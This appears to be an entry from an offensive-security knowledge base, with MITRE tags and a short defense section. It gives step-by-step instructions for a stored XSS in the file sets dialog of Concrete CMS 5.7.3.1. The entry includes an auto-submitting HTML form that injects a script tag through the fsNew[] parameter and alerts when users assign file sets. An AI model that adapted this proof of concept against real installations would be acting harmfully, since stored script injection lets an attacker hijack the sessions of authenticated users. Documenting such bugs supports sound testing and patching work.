---
tags:
  - xss
  - stored-xss
  - file-management
  - concrete-cms
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/submit-file-sets-with-xss-in-fsnew]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:41.396Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 7e3a1e7a-a272-492d-a99f-b168396be0e2
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Stored-XSS-via-File-Sets-Management-in-Concrete-CMS

## Summary

This procedure exploits stored XSS in Concrete CMS 5.7.3.1 file sets dialog by injecting a script tag into the fsNew[] POST parameter at /index.php/ccm/system/dialogs/file/sets/submit, executing when users search files and assign sets.

## Description

New file set names are stored and output unencoded in the search interface, allowing direct script injection. This disrupts file management and executes on interactions, affecting authenticated users.

## Requirements

1. Authenticated access to file dashboard
2. Existing file (fID) for dialog
3. Web browser

## Defense

Defensive measures and detection strategies:

- Sanitize file set names to alphanumeric characters
- Encode outputs in dialog and search UIs
- Monitor file management for script content
- Implement CSP to block script tags

## Objectives

1. Inject script into file set names
2. Trigger on file search and set actions
3. Compromise file workflows

## Instructions

### Step 1: Access File Sets Dialog

**Context**: Open the dialog for a specific file.

Go to /index.php/dashboard/files/search, select file with fID=1.

### Step 2: Submit Payload

**Context**: Inject direct script in array parameter.

**Command** ([[commands/submit-file-sets-with-xss-in-fsnew]]):
```html
<html>
<body>
<form method="POST" action="http://localhost/concrete5/index.php/ccm/system/dialogs/file/sets/submit?fID=1">
<input type="hidden" name="fsNew[]" value="<script>alert(/XSS/)</script>">
</form>
<script>document.forms[0].submit()</script>
</body>
</html>
```

> Adapt URL and fID.

### Step 3: Trigger Execution

**Context**: Interact in search interface.

Select file and click 'Set'.

**Expected Output**: Alert on action.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/submit-file-sets-with-xss-in-fsnew]]

## Tools Used


## Tags

- xss
- stored-xss
- concrete-cms
